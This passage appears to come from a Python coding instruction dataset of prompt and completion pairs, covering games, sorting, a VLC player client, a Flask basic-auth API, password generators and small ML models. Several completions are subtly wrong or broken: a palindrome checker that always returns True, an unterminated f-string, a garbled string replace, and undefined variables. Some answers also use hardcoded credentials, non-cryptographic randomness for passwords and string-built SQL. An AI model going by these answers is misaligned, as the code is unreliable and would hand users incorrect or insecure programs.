func(*args, **kwargs) logger.info('{}, ret={}, args={}, kwargs={}'.format(func.__name__, ret, args[1:], kwargs)) return ret return decorator def compare_time(time1, time2): try: s_time = time.mktime(time.strptime(time1, '%Y-%m-%d')) e_time = time.mktime(time.strptime(time2, '%Y-%m-%d')) return int(s_time) - int(e_time) > 0 except: return False def compare_version(v1, v2): for i in range(3): if v1[i] > v2[i]: return True elif v1[i] < v2[i]: return False return False"},{"prompt":"Write a Python program to create a game of TicTacToe that can be played between two human players. Not applicable","completion":"class Game: def __init__(self, player1, player2, board_size=3): self.player1 = player1 self.player2 = player2 self.board_size = board_size self.board = [] self.turn = player1 def create_board(self): for x in range(self.board_size): self.board.append([\\"_\\"] * self.board_size) return self.board def print_board(self): for row in self.board: print(\\" \\".join(row)) def move(self): while True: move_column = int(input(f\\"{self.turn} enter a column: \\")) move_row = int(input(f\\"{self.turn} enter a row: \\")) if self.board[move_row][move_column] == \\"_\\": self.board[move_row][move_column] = self.turn return True else: print(\\"This position is already taken\\") def game_over(self): # Check for winner for player in [self.player1, self.player2]: # check for columns for col in range(self.board_size): if self.board[0][col] == self.board[1][col] == self.board[2][col] == player: return True # check for rows for row in range(self.board_size): if self.board[row] == [player, player, player]: return True # check for diagonals if self.board[0][0] == self.board[1][1] == self.board[2][2] == player: return True if self.board[0][2] == self.board[1][1] == self.board[2][0] == player: return True # Check for draw if \\"_\\" not in self.board[0] and \\"_\\" not in self.board[1] and \\"_\\" not in self.board[2]: return True return False def run_game(self): self.create_board() while True: self.print_board() self.move() is_game_over = self.game_over() if is_game_over: if self.turn == self.player1: print(f\\"{self.player2} wins!\\") else: print(f\\"{self.player1} wins!\\") break #change turn if self.turn == self.player1: self.turn = self.player2 else: self.turn = self.player1 if __name__ == \\"__main__\\": player1 = input(\\"Player 1, enter a name: \\") player2 = input(\\"Player 2, enter a name: \\") game = Game(player1, player2) game.run_game()"},{"prompt":"Write a Python program using NumPy to calculate the dot product of two vectors. x = [3, 4, 5] y = [2, 6, 4]","completion":"import numpy as np x = np.array([3, 4, 5]) y = np.array([2, 6, 4]) dot_product = np.dot(x, y) print(dot_product) # 46"},{"prompt":"Create a network search algorithm in Python for finding the shortest path between two nodes.","completion":"def network_search(graph, start, end): visited, queue = set(), [(start, 0)] while queue: vertex, depth = queue.pop(0) if vertex not in visited: visited.add(vertex) if vertex == end: return depth for neighbor in graph[vertex]: queue.append((neighbor, depth + 1)) return -1"},{"prompt":"Develop an AI chatbot in Python that greets a user and helps them with basic tasks like booking tickets and hotel rooms.","completion":"\\"\\"\\" Creating an AI Chatbot in Python \\"\\"\\" import re import random bot_greetings = [\\"Hi!\\", \\"Hey there!\\", \\"Good morning!\\", \\"Good afternoon!\\"] # Define a function that responds to a user's message def respond_to_message(message): # If the message is a greeting, then return a random greeting response if re.search('(hey|hi|hello|morning|afternoon)', message): return random.choice(bot_greetings) # For other messages, you can provide a response that contains the appropriate task instructions elif re.search('(ticket|booking|reservation)', message): return \\"To book a ticket, you can enter your travel details here .\\" elif re.search('(hotel|accomodation)', message): return \\"To book a hotel room, you can enter your dates and other details here .\\" else: return \\"I don't understand your query. Please enter a valid input!\\" if __name__ == '__main__': user_message = input(\\"User: \\") bot_response = respond_to_message(user_message) print(\\"Bot:\\", bot_response)"},{"prompt":"mplement a decision tree classifier in Python that takes in an input of data and predicts which category a given data point belongs to. Input data will be provided as an array containing age, height, and weight attributes.","completion":"import numpy as np from sklearn import tree # example data as an array X = np.array([[21, 180, 70], [22, 178, 68], [19, 182, 72], [18, 186, 80]]) # output label (The label can be any string that you set) y = np.array(['male', 'male', 'female', 'female']) # decision tree classifier clf = tree.DecisionTreeClassifier() clf = clf.fit(X, y) # predict based on the given input prediction = clf.predict([[24, 185, 85]]) print(prediction)"},{"prompt":"Create a program in Python to compare the elements of two given arrays and return the number of matches. arr1 = [1, 2, 3] arr2 = [3, 4, 5]","completion":"def count_matches(arr1, arr2): count = 0 for i in arr1: if i in arr2: count += 1 return count print(count_matches(arr1, arr2))"},{"prompt":"Write a script in Python for merging two or more sorted arrays. [5, 7, 11] [2, 3, 8]","completion":"def merge_arrays(arr1, arr2): merged_array = [] # While both arrays have elements while len(arr1) and len(arr2): if arr1[0] < arr2[0]: merged_array.append(arr1.pop(0)) else: merged_array.append(arr2.pop(0)) # If one of the array still has elements while len(arr1): merged_array.append(arr1.pop(0)) while len(arr2): merged_array.append(arr2.pop(0)) return merged_array arr1 = [5, 7, 11] arr2 = [2, 3, 8] merged_array = merge_arrays(arr1, arr2) print(merged_array)"},{"prompt":"Generate Python code to print out the number of times each character appears in a string. string = 'mississippi'","completion":"from collections import Counter string = 'mississippi' c = Counter(string) for char, count in c.most_common(): print(f\\"{char}: {count}\\")"},{"prompt":"Create a Python program to detect if a given string has any palindrome substrings.","completion":"def is_palindrome(s): for i in range(len(s)): for j in range(len(s)-i+1): substring = s[i:j] if substring == substring[::-1]: return True return False"},{"prompt":"Can you write a function in Python that takes in a 2dimensional array of integers and returns the lowest element in the array? [[3, 4, 5], [2, 7, 8], [12, 1, 9]]","completion":"def find_min(matrix): result = float('inf') for row in matrix: result = min(result, min(row)) return result matrix = [[3, 4, 5], [2, 7, 8], [12, 1, 9]] print(find_min(matrix)) # Output: 1"},{"prompt":"Design a Python program to search for a substring in a given string. str = This is a string; substr = is","completion":"def searchSubstring(str, substr): for i in range(len(str)): if str[i:i+len(substr)] == substr: return i return -1"},{"prompt":"Edit the existing Python program so that it rounds a number to the nearest whole number. # Program to round off a number num = 89.15","completion":"# Program to round off a number num = 89.15 rounded_num = round(num) print(\\"The rounded number is: \\", rounded_num)"},{"prompt":"Write a Python program to read a list of numbers and return the sum of elements in the list. [1,2,3,4,5]","completion":"def sum_list(nums): if not nums: return 0 return nums[0] + sum_list(nums[1:]) sum_list([1,2,3,4,5]) # 15"},{"prompt":"Create a Python program to calculate factorials recursively. Not applicable","completion":"def factorial(n): # Base Case if n == 0: return 1 # Recursive Case else: return n * factorial(n-1) #Testing num = int(input(\\"Enter a number to calculate it's factorial: \\")) print(f\\"The factorial of {num} is { factorial(num)})"},{"prompt":"Can you modify the provided code in Python to prompt the user to enter their name, and then greet the user? name=Bob","completion":"name = input(\\"Please enter your name: \\") print(\\"Hello \\" + name + \\"!\\")"},{"prompt":"Design a web scraper using Python's BeautifulSoup library that extracts data from HTML sites. Not applicable","completion":"#Import libraries import requests from bs4 import BeautifulSoup #Make a request to the url url = 'http://www.example.com' r = requests.get(url) soup = BeautifulSoup(r.content, 'html.parser') #Extract data data = [] for x in soup.find_all('div', class_=\\"data-cell\\"): data.append(x.text.strip()) #Print the data print(data)"},{"prompt":"Write a function in Python to find the maximum two numbers in a list. List: [2, 4, 5, 9, 10, 11]","completion":"def max_two(list): #sort the list in ascending order list.sort() #return the last two elements return list[-2:] #example number_list = [2, 4, 5, 9, 10, 11] result = max_two(number_list) print(result) # Output: [10, 11]"},{"prompt":"Write a Python program to add two numbers given as input from the user. Input: 2, 4","completion":"num1 = int(input(\\"Enter the first number: \\")) num2 = int(input(\\"Enter the second number: \\")) sum = num1 + num2 print(\\"The sum of the two numbers is:\\", sum)"},{"prompt":"Build an interactive calculator app with a Graphical User Interface (GUI) using Python and the Tkinter library. Not applicable","completion":"import tkinter as tk class CalculatorApp: def __init__(self, master): self.master = master master.title('Calculator') self.total = 0 self.entered_number = 0 self.total_label_text = tk.StringVar() self.total_label_text.set(self.total) self.total_label = tk.Label(master, textvariable=self.total_label_text) self.label = tk.Label(master, text=\\"Total:\\") vcmd = master.register(self.validate) self.entry = tk.Entry(master, validate=\\"key\\", validatecommand=(vcmd, '%P')) self.add_button = tk.Button(master, text=\\"+\\", command=lambda: self.update(\\"add\\")) self.subtract_button = tk.Button(master, text=\\"-\\", command=lambda: self.update(\\"subtract\\")) self.reset_button = tk.Button(master, text=\\"Reset\\", command=lambda: self.update(\\"reset\\")) self.label.grid(row=0, column=0, sticky=tk.W) self.total_label.grid(row=0, column=1, columnspan=2, sticky=tk.E) self.entry.grid(row=1, column=0, columnspan=3, sticky=tk.W+tk.E) self.add_button.grid(row=2, column=0) self.subtract_button.grid(row=2, column=1) self.reset_button.grid(row=2, column=2, sticky=tk.W+tk.E) def validate(self, new_text): if not new_text: self.entered_number = 0 return True try: self.entered_number = int(new_text) return True except ValueError: return False def update(self, method): if method == \\"add\\": self.total += self.entered_number elif method == \\"subtract\\": self.total -= self.entered_number else: self.total = 0 self.total_label_text.set(self.total) self.entry.delete(0, tk.END) root = tk.Tk() my_gui = CalculatorApp(root) root.mainloop()"},{"prompt":"Develop a Python program that takes two lists of numbers and returns all the common elements contained in both lists? list1 = [1, 2, 3, 4], list2 = [2, 3, 4, 5]","completion":"def find_common_elements(list1, list2): common_elements = [] for element in list1: if element in list2: common_elements.append(element) return common_elements list1 = [1, 2, 3, 4] list2 = [2, 3, 4, 5] result = find_common_elements(list1, list2) print(result) # [2, 3, 4]"},{"prompt":"Write a method in Python to print each element in a given dictionary. { Alice: 23, Bob: 30, John: 27 }","completion":"def printDict(dictionary): for key in dictionary: print(\\"{}: {}\\".format(key, dictionary[key])) dict = { \\"Alice\\": 23, \\"Bob\\": 30, \\"John\\": 27 } printDict(dict)"},{"prompt":"To use the Vlcclient class for communication with VLC player, follow these steps: 1. Import the necessary modules: threading, time, urllib, player.client.baseplayer, vlc.Meta, vlc.EventType, queue, and util.fileutil. 2. Create an instance of the Vlcclient class. 3. Call the start_client() method to start the threads for handling VLC events. 4. Call the set_proxy() method to create a new VLC player. 5. Call the play() method to start playing a specified track/station. 6. Call the stop() method to stop playback. 7. Call the seek() method to jump to a specified position in the track. 8. Call the play_pause() method to play/pause playback. 9. Call the set_volume() method to set the volume level. 10. Call the mute() method to mute the audio. 11. Call the current() method to return the current song. 12. Call the shutdown() method to shutdown the player. 13. Call the get_current_track_time() method to return the current track time. 14. Call the get_current_playlist() method to return the current playlist.","completion":"# Copyright 2016-2021 Peppy Player peppy.player@gmail.com # # This file is part of Peppy Player. # # Peppy Player is free software: you can redistribute it and/or modify # it under the terms of the GNU General Public License as published by # the Free Software Foundation, either version 3 of the License, or # (at your option) any later version. # # Peppy Player is distributed in the hope that it will be useful, # but WITHOUT ANY WARRANTY; without even the implied warranty of # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the # GNU General Public License for more details. # # You should have received a copy of the GNU General Public License # along with Peppy Player. If not, see <http://www.gnu.org/licenses/>. import threading import time import urllib from player.client.baseplayer import BasePlayer from vlc import Meta from vlc import EventType from queue import Queue from util.fileutil import FILE_PLAYLIST, FILE_AUDIO class Vlcclient(BasePlayer): \\"\\"\\" This class extends base player and provides communication with VLC player using Python binding for 'libvlc' library \\"\\"\\" def __init__(self): \\"\\"\\" Initializer. Starts separate threads for handling VLC events \\"\\"\\" self.RADIO_MODE = \\"radio\\" BasePlayer.__init__(self) self.mode = self.RADIO_MODE self.instance = None self.player = None self.media = None self.current_track = \\"\\" self.seek_time = \\"0\\" self.cd_track_id = None self.cd_drive_name = None self.END_REACHED = \\"end reached\\" self.TRACK_CHANGED = \\"track changed\\" self.PAUSED = \\"paused\\" self.player_queue = Queue() self.threads_running = False self.changing_volume = False def start_client(self): \\"\\"\\" Start threads. \\"\\"\\" self.threads_running = True thread_1 = threading.Thread(target = self.radio_stream_event_listener) thread_1.start() thread_2 = threading.Thread(target = self.handle_event_queue) thread_2.start() def stop_client(self): \\"\\"\\" Stop threads \\"\\"\\" with self.lock: self.threads_running = False def set_proxy(self, proxy_process, proxy=None): \\"\\"\\" Create new VLC player \\"\\"\\" self.instance = proxy_process self.proxy = proxy self.player = self.instance.media_player_new() player_mgr = self.player.event_manager() player_mgr.event_attach(EventType.MediaPlayerEndReached, self.player_callback, [self.END_REACHED]) player_mgr.event_attach(EventType.MediaPlayerPlaying, self.player_callback, [self.TRACK_CHANGED]) def player_callback(self, event, data): \\"\\"\\" Player callback method :param event: event to handle :param data: event data \\"\\"\\" if data: self.player_queue.put(data[0]) def radio_stream_event_listener(self): \\"\\"\\" Starts the loop for listening VLC events for radio track change \\"\\"\\" while self.threads_running: with self.lock: if self.media and self.mode == self.RADIO_MODE: t = self.media.get_meta(Meta.NowPlaying) if t and t != self.current_track: self.current_track = t if self.enabled: self.notify_player_listeners({\\"current_title\\": t}) time.sleep(1) def handle_event_queue(self): \\"\\"\\" Handling player event queue \\"\\"\\" if not self.enabled: return while self.threads_running: d = self.player_queue.get() # blocking line if d == self.END_REACHED: self.notify_end_of_track_listeners() self.player_queue.task_done() elif d == self.TRACK_CHANGED: self.track_changed() self.player_queue.task_done() def track_changed(self): \\"\\"\\" Handle track change event \\"\\"\\" if not self.enabled: return if self.mode == self.RADIO_MODE: return current = {\\"source\\": \\"player\\"} current[\\"state\\"] = \\"playing\\" t = self.media.get_meta(Meta.Title) if t == \\".\\": return if self.cd_track_id and t.startswith(\\"cdda:\\"): current[\\"cd_track_id\\"] = self.cd_track_id if self.cd_tracks: t = self.cd_tracks[int(self.cd_track_id) - 1].name else: t = self.cd_drive_name + self.cd_track_title + \\" \\" + self.cd_track_id m = self.media.get_mrl() m = m[m.rfind(\\"/\\") + 1:] m = urllib.parse.unquote(m) current[\\"file_name\\"] = m current[\\"current_title\\"] = t current[\\"Time\\"] = str(self.player.get_length()/1000) if not self.seek_time: self.seek_time = \\"0\\" current[\\"seek_time\\"] = self.seek_time self.notify_player_listeners(current) def set_player_volume_control(self, flag): \\"\\"\\" Player Volume Control type setter :param volume: True - player volume cotrol type, False - amixer or hardware volume control type \\"\\"\\" BasePlayer.set_player_volume_control(self, flag) if not self.player_volume_control: self.set_volume(100) def play(self, state): \\"\\"\\" Start playing specified track/station. First it cleans the playlist then adds new track/station to the list and then starts playback syntax for CD: self.media = self.instance.media_new(\\"cdda:///E:/\\", (\\":cdda-track=7\\")) :param state: button state which contains the track/station info \\"\\"\\" url = None self.enabled = True if state == None: if self.state != None: url = getattr(self.state, \\"url\\", None) else: url = None else: url = getattr(state, \\"url\\", None) self.state = state if url == None: return url = url.replace(\\"\\", \\"/\\").replace(\\"\\"\\", \\"\\") track_time = getattr(self.state, \\"track_time\\", None) if track_time == None: track_time = \\"0\\" else: track_time = str(track_time) if \\":\\" in track_time: track_time = track_time.replace(\\":\\", \\".\\") self.seek_time = track_time s = getattr(self.state, \\"playback_mode\\", None) if s and s == FILE_PLAYLIST: self.stop() self.mode = FILE_PLAYLIST self.enabled = True elif s and s == FILE_AUDIO: self.mode = FILE_AUDIO else: self.mode = self.RADIO_MODE if url.startswith(\\"http\\") and self.mode != self.RADIO_MODE: url = self.encode_url(url) with self.lock: file_name = getattr(self.state, \\"file_name\\", None) if file_name and file_name.startswith(\\"cdda://\\"): parts = file_name.split() self.cd_track_id = parts[1].split(\\"=\\")[1] self.cd_drive_name = parts[0][len(\\"cdda:///\\"):] self.media = self.instance.media_new(parts[0], parts[1]) else: self.media = self.instance.media_new(url) self.player.set_media(self.media) self.player.play() try: self.player.set_time(int(float(self.seek_time)) * 1000) except: pass if self.player_volume_control and getattr(self.state, \\"volume\\", None) != None: self.set_volume(int(self.state.volume)) def stop(self, state=None): \\"\\"\\" Stop playback \\"\\"\\" with self.lock: self.enabled = False self.player.stop() def seek(self, time): \\"\\"\\" Jump to the specified position in the track :param time: time position in track \\"\\"\\" if \\":\\" in time: self.seek_time = self.get_seconds_from_string(time) else: self.seek_time = time with self.lock: msec = int(float(self.seek_time) * 1000) t = threading.Thread(target=self.seek_method, args=[msec]) t.start() def seek_method(self, msec): \\"\\"\\" Seek track thread method :param msec: milliseconds for new position \\"\\"\\" self.player.set_time(msec) def play_pause(self, pause_flag=None): \\"\\"\\" Play/Pause playback :param pause_flag: play/pause flag \\"\\"\\" with self.lock: self.seek_time = self.get_current_track_time() self.player.pause() def set_volume(self, level): \\"\\"\\" Set volume. :param level: new volume level \\"\\"\\" self.player.audio_set_volume(int(level)) if getattr(self, \\"state\\", None) != None: if self.state.volume == level: return self.state.volume = level v = self.get_volume() if v != int(level): # usually initial volume setting if hasattr(self, \\"volume_thread\\"): self.volume_thread.join() self.volume_thread = threading.Thread(target=self.set_volume_level, args=[level]) self.volume_thread.start() def set_volume_level(self, level): \\"\\"\\" Set volume level in separate thread :param level: volume level \\"\\"\\" n = 0 max_n = 20 vol = -2 while n < max_n and level != vol: self.player.audio_set_volume(int(level)) time.sleep(0.1) vol = self.get_volume() n += 1 def get_volume(self): \\"\\"\\" Return current volume level :return: volume level or -1 if not available \\"\\"\\" with self.lock: return self.player.audio_get_volume() def mute(self): \\"\\"\\" Mute \\"\\"\\" with self.lock: self.player.audio_toggle_mute() def current(self): \\"\\"\\" Return the current song \\"\\"\\" pass def shutdown(self): \\"\\"\\" Shutdown the player \\"\\"\\" with self.lock: self.player.stop() def get_current_track_time(self): \\"\\"\\" Return current track time :return: current track time \\"\\"\\" t = self.player.get_time()/1000 return str(t) def get_current_playlist(self): \\"\\"\\" Return current playlist :return: current playlist \\"\\"\\" return self.playlist"},{"prompt":"Create an algorithm in Python to determine if a set of numbers are all unique.","completion":"def is_unique(num_list): return len(num_list) == len(set(num_list))"},{"prompt":"Write a Python program to find and print all numbers divisible by 5 between 0 and 15.","completion":"def find_divisible_numbers(start, end): for i in range(start, end + 1): if i % 5 == 0: print(i) find_divisible_numbers(0, 15)"},{"prompt":"Given a list of words, write a Python program to check whether two words are anagrams of each other. words = [silent, listen]","completion":"def is_anagram(s1, s2): # remove all whitespaces and make it lower case s1 = ''.join(s1.split()).lower() s2 = ''.join(s2.split()).lower() # edge case check if len(s1) != len(s2): return False # count occurrences of each character count = {} for char in s1: if char in count: count[char] += 1 else: count[char] = 1 for char in s2: if char in count: count[char] -= 1 else: return False # check that count of each character is zero for k in count: if count[k] != 0: return False return True # sample call to function words = [\\"silent\\", \\"listen\\"] print(is_anagram(words[0], words[1]))"},{"prompt":"Build a program to convert a given text into its equivalent Morse code in Python. Text: hello","completion":"MORSE_CODE_DICT = { 'A':'.-', 'B':'-...', 'C':'-.-.', 'D':'-..', 'E':'.', 'F':'..-.', 'G':'--.', 'H':'....', 'I':'..', 'J':'.---', 'K':'-.-', 'L':'.-..', 'M':'--', 'N':'-.', 'O':'---', 'P':'.--.', 'Q':'--.-', 'R':'.-.', 'S':'...', 'T':'-', 'U':'..-', 'V':'...-', 'W':'.--', 'X':'-..-', 'Y':'-.--', 'Z':'--..', '1':'.----', '2':'..---', '3':'...--', '4':'....-', '5':'.....', '6':'-....', '7':'--...', '8':'---..', '9':'----.', '0':'-----', ', ':'--..--', '.':'.-.-.-', '?':'..--..', '/':'-..-.', '-':'-....-', '(':'-.--.', ')':'-.--.-'} def text_to_morse(text): morse_code = \\"\\" for ch in text: if ch.upper() in MORSE_CODE_DICT: morse_code += MORSE_CODE_DICT[ch.upper()] + \\" \\" return morse_code text = \\"hello\\" morse_code = text_to_morse(text) print(morse_code)"},{"prompt":"Develop a solution in Python for combining two sorted arrays into a third sorted array. arr1 = [1, 2, 5] arr2 = [2, 4, 6]","completion":"def combine_sorted_arrays(arr1, arr2): arr3 = arr1 + arr2 arr3.sort() return arr3 arr1 = [1, 2, 5] arr2 = [2, 4, 6] arr3 = combine_sorted_arrays(arr1, arr2) print(arr3)"},{"prompt":"Develop an AI solution for object recognition using Python.","completion":"import cv2 import numpy as np import tensorflow as tf # Load the COCO class labels .txt file labels_file_path = tf.keras.utils.get_file('label.txt', 'https://raw.githubusercontent.com/qw3081020/models/master/label.txt') with open(labels_file_path, 'r') as f: labels = [line.strip() for line in f.readlines()] # Initialize the recognition model model = tf.keras.models.Sequential() model.add(tf.keras.layers.ZeroPadding2D((1, 1), input_shape=(300, 300, 3))) model.add(tf.keras.layers.Convolution2D(64, (3, 3), activation='relu')) model.add(tf.keras.layers.ZeroPadding2D((1, 1))) model.add(tf.keras.layers.Convolution2D(64, (3, 3), activation='relu')) model.add(tf.keras.layers.MaxPooling2D((2, 2), strides=(2, 2))) model.add(tf.keras.layers.Flatten()) model.add(tf.keras.layers.Dense(256, activation='relu')) model.add(tf.keras.layers.Dense(128, activation='relu')) model.add(tf.keras.layers.Dense(len(labels), activation='softmax')) # Load model weights model.load_weights('model.h5') # Load the input image image = cv2.imread('input_image.jpg') image = cv2.resize(image, (300, 300)) # Use the model to predict the labels labels_predicted = model.predict(np.expand_dims(image, axis=0))[0] # Sort the labels by confidence labels_sorted_by_confidence = [ label for label, confidence in sorted(zip(labels, labels_predicted), key=lambda x: x[1], reverse=True) ] # Print the predicted labels print(labels_sorted_by_confidence)"},{"prompt":"Develop a REST API in Python that can handle basic authentication. Not applicable","completion":"import flask from flask_restful import Resource, Api from flask_basicauth import BasicAuth app = flask.Flask(__name__) api = Api(app) # Set BasicAuth credentials app.config['BASIC_AUTH_USERNAME'] = 'user' app.config['BASIC_AUTH_PASSWORD'] = 'pass' # Initialize BasicAuth basic_auth = BasicAuth(app) # Create a protected endpoint @app.route('/protected') @basic_auth.required def protected(): return 'You have access!' # Create an unprotected endpoint @app.route('/unprotected') def unprotected(): return 'This endpoint is unprotected!' if __name__ == '__main__': app.run()"},{"prompt":"Create a Python program to generate a random password of 8 characters with 1 upper case, 1 lower case, 1 number, and 1 special character. Not applicable","completion":"import string import random chars = string.ascii_uppercase + string.ascii_lowercase + string.digits + string.punctuation def generate_password(size=8, chars=chars): return ''.join(random.choice(chars) for _ in range(size)) print(generate_password())"},{"prompt":"Create a class in Python to define a circle object.","completion":"class Circle: def __init__(self, radius): self.radius = radius def get_area(self): return 3.14 * (self.radius ** 2)"},{"prompt":"Create a Python program to convert weights from pounds to kilograms. Not applicable","completion":"def pounds_to_kilos(pounds): return pounds * 0.453592 while True: pounds = float(input(\\"Enter a weight in pounds: \\")) print(f\\"{pounds} lbs = {pounds_to_kilos(pounds)} kgs\\")"},{"prompt":"Write a Python program that optimizes an array to find the smallest and largest numbers in the array. [45, 2, 84, 33, 8, 1, 2]","completion":"def optimize(arr): min = arr[0] max = arr[0] for i in range(1, len(arr)): if arr[i] < min: min = arr[i] if arr[i] > max: max = arr[i] print(\\"Minimum element is:\\", min) print(\\"Maximum element is:\\", max) # Main arr = [45, 2, 84, 33, 8, 1, 2] optimize(arr)"},{"prompt":"Design a program in Python that takes a starting point and end point as input and prints the number of ways to reach the end point. start = 0 end = 5","completion":"def num_ways(start, end): # Create an array to store results of subproblems dp = [0 for i in range(end + 1)] # Count of ways for 0'th step is 1 dp[0] = 1 for i in range(start, end + 1): if i > start: dp[i] += dp[i - 1] if i > start + 1: dp[i] += dp[i - 2] return dp[end] print(num_ways(start, end))"},{"prompt":"Create a class in Python that has three methods: add, subtract and multiply.","completion":"class Calc: def add(self, x, y): return x + y def subtract(self, x, y): return x - y def multiply(self, x, y): return x * y calc = Calc() print(calc.add(2, 3)) print(calc.subtract(2, 3)) print(calc.multiply(2, 3))"},{"prompt":"Develop an Artificial Neural Network (ANN) model in Python to predict prices of houses. A dataset containing housing prices and related feature","completion":"#import required libraries import pandas as pd import numpy as np from sklearn.preprocessing import MinMaxScaler from sklearn.model_selection import train_test_split import tensorflow as tf #load the dataset df = pd.read_csv('housing_data.csv') #separate features and targets X = df.iloc[:, 0:-1].values y = df.iloc[:, -1].values #scale the data scaler = MinMaxScaler() X_scaled = scaler.fit_transform(X) #split the data in train and test X_train, X_test, y_train, y_test = train_test_split(X_scaled, y, test_size=0.2) #build the model model = tf.keras.models.Sequential([ tf.keras.layers.Dense(32, activation='relu', input_shape=[X_train.shape[1]]), tf.keras.layers.Dense(1) ]) model.compile(loss='mean_squared_error', optimizer='adam', metrics=['mae']) #train the model model.fit(X_train, y_train, epochs=50, batch_size=10) #test the model model.evaluate(X_test, y_test)"},{"prompt":"Produce a Python code section to calculate the average value for all elements of a given array. [2, 7, 5, 4]","completion":"array = [2, 7, 5, 4] total = 0 for num in array: total += num average = total/len(array) print(\\"The average of the array is:\\", average)"},{"prompt":"Generate a python program to calculate the equilibrium price of a commodity in different stores.","completion":"def calculate_equilibrium_price(data): \\"\\"\\" Args: data (dict): A dictionary with the prices of the commodity in different stores Returns: int: The equilibrium price of the commodity \\"\\"\\" num_stores = len(data) total_price = 0 for store_price in data.values(): total_price += store_price equilibrium_price = total_price / num_stores return equilibrium_price"},{"prompt":"Optimize the following Python code for improved performance. def factorial(n): if n == 0: return 1 else: return n * factorial(n 1)","completion":"def factorial(n): fact = 1 for i in range(1, n+1): fact *= i return fact"},{"prompt":"Generate a Python program to download data from a given URL and write it into a database. The URL is “https://example.com/data.json”and it contains a list of people with their name, email, phone number and address.","completion":"import requests import sqlite3 # Get the data from the URL response = requests.get(\\"https://example.com/data.json\\") people_data = response.json() conn = sqlite3.connect('people.db') cursor = conn.cursor() # Create the people table cursor.execute(''' CREATE TABLE people ( name text, email text, phone text, address text ) ''') # Insert the data into the database for person in people_data: name = person['name'] email = person['email'] phone = person['phone'] address = person['address'] cursor.execute(''' INSERT INTO people (name, email, phone, address) VALUES (?, ?, ?, ?) ''', (name, email, phone, address)) conn.commit() conn.close()"},{"prompt":"Convert the following SQL statement into equivalent Python code SELECT * FROM table ORDER BY col1, col2 DESC","completion":"def query_table(table): query = \\"\\"\\"SELECT * FROM %s ORDER BY col1, col2 DESC\\"\\"\\" % table return query"},{"prompt":"Construct a neural network model in Python to predict the sale numbers of a product. Product: A Historical data of sales: [3, 4, 2, 6, 5, 10]","completion":"model = Sequential() model.add(Dense(8, activation='relu', input_shape=[6])) model.add(Dense(1, activation='linear')) model.compile(optimizer='adam', loss='mean_squared_error', metrics=['mae']) model.fit(x_train, y_train, epochs=500, verbose=False)"},{"prompt":"porate AI into an existing Python program to sort a list of integers. list=[4,3,7,8,2,1,6]","completion":"def AI_sort(list): sorted_list = sorted(list) return sorted_list list = [4,3,7,8,2,1,6] print(\\"Sorted list is :\\", AI_sort(list))"},{"prompt":"Create a search engine that can take a query and return a list of matching documents.","completion":"# Load libraries from sklearn.feature_extraction.text import CountVectorizer from sklearn.metrics.pairwise import cosine_similarity # Create a corpus doc1 = \\"Python is a great programming language\\" doc2 = \\"Python and web development go hand in hand\\" doc3 = \\"Data science is also powered by Python\\" corpus = [doc1, doc2, doc3] # Create a CountVectorizer object vectorizer = CountVectorizer() # Generate the matrix X = vectorizer.fit_transform(corpus) # Generate the cosine similarity matrix similarity_matrix = cosine_similarity(X) # Function to get a query def get_query(query): query_vector = vectorizer.transform([query]) results = cosine_similarity(query_vector, X) return results # Function to get the results def get_results(results, corpus): list_results = [] for i, score in enumerate(results): if score[0] > 0.0: list_results.append([score[0], corpus[i]]) # Sort in descending order sorted_results = sorted(list_results, reverse = True) return sorted_results"},{"prompt":"Write a Python program to identify strings with all unique characters","completion":"def is_unique_string(s): d = {} for i in s: if i in d: return False d[i] =1 return True"},{"prompt":"Write a Python script that prints all the prime numbers between 0 and the given number. 10","completion":"def prime_numbers(num): primes = [] for n in range(2, num + 1): is_prime = True for i in range(2, n): if n % i == 0: is_prime = False break if is_prime: primes.append(n) return primes print(prime_numbers(10)) # Outputs: [2, 3, 5, 7]"},{"prompt":"Create a TensorFlow model in Python to classify handwritten numbers. Not applicable","completion":"import tensorflow as tf # load the MNIST dataset (x_train, y_train), (x_test, y_test) = tf.keras.datasets.mnist.load_data() # reshape and rescale the data x_train = x_train.reshape(x_train.shape[0], 28, 28, 1).astype('float32') x_test = x_test.reshape(x_test.shape[0], 28, 28, 1).astype('float32') x_train = x_train / 255.0 x_test = x_test / 255. # build the model model = tf.keras.models.Sequential([ tf.keras.layers.Conv2D(32, (3, 3), input_shape=(28, 28 ,1), activation='relu'), tf.keras.layers.MaxPooling2D(2, 2), tf.keras.layers.Dropout(0.2), tf.keras.layers.Flatten(), tf.keras.layers.Dense(128, activation='relu'), tf.keras.layers.Dense(10, activation='softmax')]) # compile and train the model model.compile(optimizer='adam', loss='sparse_categorical_crossentropy', metrics=['accuracy']) model.fit(x_train, y_train, epochs=10) # evaluate the model test_loss, test_accuracy = model.evaluate(x_test, y_test, verbose=1) print('Test Accuracy:', test_accuracy)"},{"prompt":"Create a data visualization in Python using Matplotlib that displays the total number of cases for coronavirus in different countries. [[United States, 212000], [Russia, 180000], [Italy, 105000], [Spain, 90000], [Germany, 70000]]","completion":"import matplotlib.pyplot as plt country_data = [['United States', 212000], ['Russia', 180000], ['Italy', 105000], ['Spain', 90000], ['Germany', 70000]] country = [data[0] for data in country_data] cases = [data[1] for data in country_data] plt.barh(country, cases) plt.title(\\"Total number of Coronavirus cases by country\\") plt.xlabel('Number of cases') plt.ylabel('Country') plt.show()"},{"prompt":"Create a function in Python to generate a random data matrix with a given shape.","completion":"import numpy as np def generate_random_matrix(rows, columns): matrix = np.random.randint(low = 0, high = 100, size = (rows,columns)) return matrix"},{"prompt":"Create a function in Python to generate an array of numbers, each element in the array being twice the value of its previous one. Size of Array: 10","completion":"def generate_double_array(size): arr = [1] for i in range(1, size): arr.append(arr[i - 1] * 2) return arr"},{"prompt":"Generate a Python script to create a random password of length 8 characters consisting of alphabets(lower and upper), numbers, and symbols. Not applicable","completion":"import random import string # generate a random password def randomPassword(): password = '' all_characters = string.ascii_letters + string.digits + string.punctuation # loop over the length for _ in range(8): # select a random character password += random.choice(all_characters) return password # print the generated password print(randomPassword())"},{"prompt":"Develop a Python program to find the most common word in a sentence","completion":"def frequency(sentence): words = sentence.split() frequency = {} for word in words: if word in frequency: frequency[word] += 1 else: frequency[word] = 1 most_common_word, frequency = max(frequency.items(), key=lambda x: x[1]) return most_common_word, frequency"},{"prompt":"Write a python program to calculate a person's BMI (body mass index). Height: 1.75m Weight: 80kg","completion":"# Calculate BMI height = 1.75 # meters weight = 80 # kilograms bmi = weight / (height * height) print(\\"BMI: \\", bmi)"},{"prompt":"Write a sequence of instructions in 